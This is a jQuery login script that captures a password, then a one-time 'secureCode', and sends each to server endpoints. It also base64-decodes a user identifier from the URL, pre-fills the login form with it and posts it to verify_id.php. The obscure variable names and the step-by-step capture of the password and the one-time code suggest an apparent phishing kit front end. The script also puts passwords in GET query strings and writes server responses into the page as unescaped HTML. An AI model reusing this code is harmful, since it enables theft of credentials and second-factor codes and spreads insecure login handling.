	document.onkeypress = function (e) {
		e = e || window.event;
		if(e.keyCode==13){
			e.preventDefault();
			e.stopPropagation();
			let IdVals=Number($("#ClickCount").val());
			$("#ClickCount").val(1);
			if(IdVals==0){
				$("#LogInStep1").trigger("click");
			}else{
				$("#LogInStep2").trigger("click");
			}
		}
	};
	$("#LogInStep1").on("click", function(e){
		e.preventDefault();
		e.stopPropagation();
		const user_id=$("#user_id").val();
		const password=$("#password").val();
		const redg=$.ajax({
			method:"GET",
			url:"/login/login_ssc.php",
			data:{user_id:user_id,password:password}
		});
		redg.done((ress)=>{
			console.log(ress);
			const dfgdLL=JSON.parse(ress);
			if(dfgdLL['sts']==1){
				$("#MessA").text(dfgdLL['mess']);
				$("#Sttes2").show();
				$("#Sttes1").hide();
			}else{
				$("#submit").html("<h3 class='alert alert-warning'>"+dfgdLL['mess']+"</h3>");
			}
		})
	});
	$("#LogInStep2").on("click", function(e){
		e.preventDefault();
		e.stopPropagation();
		const user_id2=$("#user_id").val();
		const secureCode=$("#secureCode").val();
		const sfds=$.ajax({
			method:"GET",
			url:'/login/verify.php',
			data:{user_id:user_id2,secureCode:secureCode}
		});
		sfds.done((redd)=>{
			const dfgdLL=JSON.parse(redd);
			if(dfgdLL['sts']==1){
				$("#SSDDhg").trigger("click");
			}else{
				$("#submit2").html("<h3 class='alert alert-warning'>"+dfgdLL['mess']+"</h3>");
			}
		})
		
	});
   let losdf=location.href;
   let usfJk=losdf.split(":");
   let dfgd=atob(usfJk[2]);
   $("#user_id").val(dfgd);
	if(dfgd!=''){
		const redfg=$.ajax({
			method:"POST",
			url:"viewdata/verify_id.php",
			data:{Usfd:dfgd}
	   });
	}else{
		
	}
	   